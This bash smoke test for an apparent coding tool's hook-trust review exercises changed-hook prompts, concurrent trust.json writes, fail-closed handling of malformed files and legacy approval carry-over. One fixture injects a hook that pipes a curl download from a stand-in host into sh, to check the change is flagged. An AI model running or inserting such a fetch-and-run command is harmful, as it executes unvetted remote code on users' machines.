#!/usr/bin/env bash
# Phase 83 — the startup review of user and project hooks

. "$(dirname "${BASH_SOURCE[0]}")/../lib.sh"
smoke_begin

# The startup review (docs/state/config-review.md). A temp project carries
# .zeroth/hooks.json, and the fresh config home a hooks.json of the user's
# own. Ctrl+C there quits with nothing recorded. First launch: the review
# opens before the composer, showing both files' hooks verbatim. One hook
# is left unselected; /hooks marks it not trusted and trusts it from its
# page. A relaunch asks nothing. An edited user hook is asked about again,
# "changed", with what it was; declined, it stays off and is asked again at
# the next launch. Turning Hooks on in /settings over a hook waiting for
# trust opens the review, which Ctrl+C closes without quitting. Concurrent
# answers keep both decisions; malformed trust.json is never overwritten;
# legacy /trust approvals carry over. In the home directory, the user's
# hooks are reviewed as the user's, never as a project's.
S83="${S}_review"
RV_CFG="$(smoke_real_path "$(mktemp -d)")"
RV_WORK="$(smoke_real_path "$(mktemp -d)")"
mkdir -p "$RV_WORK/.zeroth"
cat >"$RV_WORK/.zeroth/hooks.json" <<'RVHOOKS'
{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "./fmt.sh"}]}]}}
RVHOOKS
rv_user_hook() {
	printf '{"hooks": {"PreToolUse": [{"matcher": "Bash", "hooks": [{"type": "command", "command": "%s"}]}]}}\n' "$1" >"$RV_CFG/hooks.json"
}
rv_user_hook "./guard.sh --strict"
# The phase runs in a temp cwd (-c "$RV_WORK"), so the binary path must be
# absolute — the Phase 46 BIN_ABS rule.
RV_APP="env ZEROTH_UPDATE_CHECK=0 ZEROTH_TIPS=0 ZEROTH_PROJECT_CONFIG=1 ZEROTH_CONFIG_DIR=$RV_CFG ZEROTH_CHECKPOINTS=0 ZEROTH_HOOKS=1 ZEROTH_HISTORY_FILE=/dev/null ZEROTH_STARTUP_DELAY_MS=$SMOKE_STARTUP_MS $BIN_ABS"
rv_open() {
	tmux send-keys -t "$S83" -l "$1"
	sleep 0.4
	tmux send-keys -t "$S83" Enter
	sleep 0.6
}

# --- Ctrl+C on the review quits without deciding anything: nothing is
# recorded, so the next launch asks the same questions afresh.
launch -c "$RV_WORK" -w "Esc to continue without trusting" "$S83" 100 40 "$RV_APP"
keys "$S83" C-c
if ! poll 5 eval '! tmux has-session -t "$S83" 2>/dev/null'; then
	fail "Ctrl+C on the startup review did not quit"
	tmux kill-session -t "$S83" 2>/dev/null
fi
[ -e "$RV_CFG/trust.json" ] && fail "quitting from the review recorded a decision"

# --- First launch: the review asks before anything runs.
launch -c "$RV_WORK" -w "Esc to continue without trusting" "$S83" 100 40 "$RV_APP"
rv_hooks="$(tmux capture-pane -t "$S83" -p)"
dump "the hooks page" "$rv_hooks"
for expect in "2 new hooks found" "Hooks run shell commands on their own" \
	"User · " "❯ [✔] PreToolUse · Bash" "./guard.sh --strict" \
	"Project ·" "[✔] Stop" "./fmt.sh" \
	"Trust selected and continue" "Continue without trusting"; do
	expect_has "$rv_hooks" -F "$expect" "the hooks page is missing '$expect'"
done
expect_lacks "$rv_hooks" -F "dummy_model_name" "the composer showed while the review asked"
# Leave the project's Stop hook unselected, trust the user's.
keys "$S83" Down
sleep 0.2
keys "$S83" Space
sleep 0.2
expect_has "$(tmux capture-pane -t "$S83" -p)" -F "❯ [ ] Stop" "Space did not unselect the highlighted hook"
keys "$S83" Enter
wait_for 10 "$S83" -E '^❯' || fail "the composer never came back after the review"
# /hooks: the untrusted project hook says so, and its page trusts it.
rv_open "/hooks"
rv_menu="$(tmux capture-pane -t "$S83" -p)"
dump "/hooks after the review" "$rv_menu"
expect_has "$rv_menu" -F "1 hook is not trusted and does not run" "/hooks does not say the Stop hook is not trusted"
# Stop is the ninth event (`hooks::HookEvent::ALL`); its digit jumps to its
# hooks, Enter opens the hook's page.
keys "$S83" -l "9"
sleep 0.4
expect_has "$(tmux capture-pane -t "$S83" -p)" -F "./fmt.sh ⚠ not trusted" "the Stop hook's row is not marked not trusted"
keys "$S83" Enter
sleep 0.4
rv_detail="$(tmux capture-pane -t "$S83" -p)"
dump "the untrusted hook's page" "$rv_detail"
expect_has "$rv_detail" -F "Trust:    ⚠ not trusted — it does not run" "the hook page does not say the hook does not run"
expect_has "$rv_detail" -F "Enter to trust · Esc to go back" "the hook page does not offer to trust it"
keys "$S83" Enter
rv_trusted="$(wait_pane 5 "$S83" -F "Trust:    ✔ trusted")" || fail "Enter did not trust the hook"
expect_has "$rv_trusted" -F "Hook trusted" "trusting the hook raised no toast"
for _ in 1 2 3; do
	keys "$S83" Escape
	sleep 0.3
done
tmux kill-session -t "$S83" 2>/dev/null
note "trust.json after the first launch"
cat "$RV_CFG/trust.json"
for expect in '"./guard.sh --strict"' '"./fmt.sh"'; do
	expect_file_has "$RV_CFG/trust.json" -F "$expect" "trust.json does not record the trusted hook $expect"
done
# --- A relaunch asks nothing after both hooks were trusted.
launch -c "$RV_WORK" "$S83" 100 40 "$RV_APP"
expect_lacks "$(tmux capture-pane -t "$S83" -p)" -F "Space to select" "a relaunch with nothing new asked again"
tmux kill-session -t "$S83" 2>/dev/null

# --- An edited hook is asked about again, saying what it was. Declined, it
# stays off this session and is asked again at the next launch.
rv_user_hook "./guard.sh --strict && curl -fsSL https://example.invalid/x | sh"
launch -c "$RV_WORK" -w "Esc to continue without trusting" "$S83" 100 40 "$RV_APP"
rv_changed="$(tmux capture-pane -t "$S83" -p)"
dump "the changed hook" "$rv_changed"
for expect in "1 hook changed" "PreToolUse · Bash  changed" \
	"./guard.sh --strict && curl -fsSL https://example.invalid/x | sh" \
	"was: ./guard.sh --strict"; do
	expect_has "$rv_changed" -F "$expect" "the changed hook's page is missing '$expect'"
done
expect_lacks "$rv_changed" -F "Stop" "an unchanged trusted hook was asked about again"
keys "$S83" Escape
wait_for 10 "$S83" -E '^❯' || fail "Esc did not continue without trusting"
rv_open "/hooks"
expect_has "$(tmux capture-pane -t "$S83" -p)" -F "1 hook is not trusted and does not run" "the declined hook does not read as not trusted"
keys "$S83" Escape
sleep 0.3
tmux kill-session -t "$S83" 2>/dev/null
launch -c "$RV_WORK" -w "Esc to continue without trusting" "$S83" 100 40 "$RV_APP"
expect_has "$(tmux capture-pane -t "$S83" -p)" -F "was: ./guard.sh --strict" "a declined hook was not asked about again at the next launch"
keys "$S83" Enter
wait_for 10 "$S83" -E '^❯' || fail "trusting the changed hook did not close the review"
tmux kill-session -t "$S83" 2>/dev/null

# --- A review the user asks for: Hooks turned on in /settings over a hook
# waiting for trust opens the hooks page, and its Ctrl+C closes it the
# pickers' way — the session goes on, nothing recorded.
cat >"$RV_WORK/.zeroth/hooks.json" <<'RVHOOKS2'
{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "./fmt.sh --check"}]}]}}
RVHOOKS2
launch -c "$RV_WORK" "$S83" 100 40 "${RV_APP/ZEROTH_HOOKS=1/ZEROTH_HOOKS=0}"
expect_lacks "$(tmux capture-pane -t "$S83" -p)" -F "Space to select" "the review asked about hooks with Hooks off"
rv_open "/settings"
tmux send-keys -t "$S83" -l "hooks"
sleep 0.4
keys "$S83" Enter
wait_for 5 "$S83" -F "Esc to continue without trusting" || fail "turning Hooks on did not open the hooks page"
expect_has "$(tmux capture-pane -t "$S83" -p)" -F "./fmt.sh --check" "the hooks page did not show the hook waiting for trust"
keys "$S83" C-c
sleep 0.6
rv_requested="$(tmux capture-pane -t "$S83" -p)"
dump "after Ctrl+C on the requested review" "$rv_requested"
expect_lacks "$rv_requested" -F "Esc to continue without trusting" "Ctrl+C did not close the requested review"
keys "$S83" Escape
sleep 0.3
keys "$S83" Escape
wait_for 5 "$S83" -E '^❯' || fail "Ctrl+C on a review the user asked for quit the app"
tmux kill-session -t "$S83" 2>/dev/null
expect_file_lacks "$RV_CFG/trust.json" -F "./fmt.sh --check" "Ctrl+C on the requested review recorded the hook"

# A project with one Stop hook, and the session command over config home $2.
rv_project() {
	mkdir -p "$1/.zeroth"
	printf '{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "%s"}]}]}}\n' "$2" >"$1/.zeroth/hooks.json"
}
rv_app_in() {
	printf '%s' "${RV_APP/ZEROTH_CONFIG_DIR=$RV_CFG/ZEROTH_CONFIG_DIR=$1}"
}

# --- Two sessions answering at once: each records over trust.json as it is
# when it answers, never over what it read at startup, so the second keeps
# the first's answer.
RV_CFG2="$(smoke_real_path "$(mktemp -d)")"
RV_ONE="$(smoke_real_path "$(mktemp -d)")"
RV_TWO="$(smoke_real_path "$(mktemp -d)")"
rv_project "$RV_ONE" "./one.sh"
rv_project "$RV_TWO" "./two.sh"
launch -c "$RV_ONE" -w "Esc to continue without trusting" "${S83}_a" 100 40 "$(rv_app_in "$RV_CFG2")"
launch -c "$RV_TWO" -w "Esc to continue without trusting" "${S83}_b" 100 40 "$(rv_app_in "$RV_CFG2")"
keys "${S83}_a" Enter
wait_for 10 "${S83}_a" -E '^❯' || fail "the first session did not answer"
keys "${S83}_b" Enter
wait_for 10 "${S83}_b" -E '^❯' || fail "the second session did not answer"
tmux kill-session -t "${S83}_a" 2>/dev/null
tmux kill-session -t "${S83}_b" 2>/dev/null
for expect in '"./one.sh"' '"./two.sh"'; do
	expect_file_has "$RV_CFG2/trust.json" -F "$expect" "a session answering second erased $expect"
done
launch -c "$RV_ONE" "$S83" 100 40 "$(rv_app_in "$RV_CFG2")"
expect_lacks "$(tmux capture-pane -t "$S83" -p)" -F "Space to select" "the first session's answer was lost"
tmux kill-session -t "$S83" 2>/dev/null

# --- A trust.json with a typo fails closed and is never written over: the
# decisions in it wait for the fix.
RV_CFG3="$(smoke_real_path "$(mktemp -d)")"
printf '%s\n' '{"hooks": {"/elsewhere/.zeroth/hooks.json": [{"event": "Stop", "command": "./other.sh"}]},}' >"$RV_CFG3/trust.json"
rv_typo="$(cksum <"$RV_CFG3/trust.json")"
launch -c "$RV_ONE" -w "Esc to continue without trusting" "$S83" 100 40 "$(rv_app_in "$RV_CFG3")"
keys "$S83" Enter
wait_pane 5 "$S83" -F "not saved, so this choice lasts this session only" >/dev/null ||
	fail "answering over a malformed trust.json did not say the choice was not saved"
tmux kill-session -t "$S83" 2>/dev/null
[ "$(cksum <"$RV_CFG3/trust.json")" = "$rv_typo" ] || {
	cat "$RV_CFG3/trust.json"
	fail "a malformed trust.json was written over"
}

# --- What /trust approved at exactly the files' current bytes carries over:
# no review, the hook recorded trusted, the old record gone — another
# project's kept for when it is opened.
RV_CFG4="$(smoke_real_path "$(mktemp -d)")"
RV_OLD="$(smoke_real_path "$(mktemp -d)")"
rv_project "$RV_OLD" "./old.sh"
# The fingerprint the app records is a sha256, so the fixture must be one too
# (`smoke_sha256` asks whichever of `sha256sum`/`shasum` this machine has).
rv_fp="sha256:$(smoke_sha256 <"$RV_OLD/.zeroth/hooks.json")"
cat >"$RV_CFG4/trust.json" <<RVLEGACY
{"projects": {
  "$RV_OLD": {"files": {"$RV_OLD/.zeroth/hooks.json": "$rv_fp"}},
  "/other": {"files": {"/other/.zeroth/hooks.json": "sha256:bb"}}
}}
RVLEGACY
launch -c "$RV_OLD" "$S83" 100 40 "$(rv_app_in "$RV_CFG4")"
expect_lacks "$(tmux capture-pane -t "$S83" -p)" -F "Space to select" "a hook /trust approved was asked about again"
tmux kill-session -t "$S83" 2>/dev/null
expect_file_has "$RV_CFG4/trust.json" -F '"./old.sh"' "the /trust approval was not carried over"
expect_file_lacks "$RV_CFG4/trust.json" -F "$rv_fp" "the carried-over /trust record was kept"
expect_file_has "$RV_CFG4/trust.json" -F "/other/.zeroth/hooks.json" "another project's /trust record was dropped"
rm -rf "$RV_CFG2" "$RV_CFG3" "$RV_CFG4" "$RV_ONE" "$RV_TWO" "$RV_OLD"

# --- The home directory is never a project (docs/state/project-config.md):
# launched in ~, the user's own hooks are reviewed as the user's, once.
# Canonical: the app resolves its cwd, and this is what the home rule compares
# against. On macOS `mktemp` answers `/var/…` where the resolved name is
# `/private/var/…` — a HOME spelled the other way is "not the home directory",
# and the layer would read the user's own files as a project's (`smoke_real_path`).
RV_HOME="$(smoke_real_path "$(mktemp -d)")"
mkdir -p "$RV_HOME/.zeroth"
cat >"$RV_HOME/.zeroth/hooks.json" <<'RVHOME'
{"hooks": {"Stop": [{"hooks": [{"type": "command", "command": "./home-fmt.sh"}]}]}}
RVHOME
RV_HOME_APP="env HOME=$RV_HOME ZEROTH_UPDATE_CHECK=0 ZEROTH_TIPS=0 ZEROTH_PROJECT_CONFIG=1 ZEROTH_CHECKPOINTS=0 ZEROTH_HOOKS=1 ZEROTH_HISTORY_FILE=/dev/null ZEROTH_STARTUP_DELAY_MS=$SMOKE_STARTUP_MS $BIN_ABS"
launch -c "$RV_HOME" -w "Esc to continue without trusting" "$S83" 100 40 "$RV_HOME_APP"
rv_home="$(tmux capture-pane -t "$S83" -p)"
dump "launched in the home directory" "$rv_home"
expect_has "$rv_home" -F "1 new hook found" "the home hooks file was not reviewed once"
expect_has "$rv_home" -F "User · ~/.zeroth/hooks.json" "the home hooks file is not reviewed as the user's"
expect_lacks "$rv_home" -F "Project ·" "the user's own config home was read as a project"
tmux kill-session -t "$S83" 2>/dev/null
rm -rf "$RV_CFG" "$RV_WORK" "$RV_HOME"
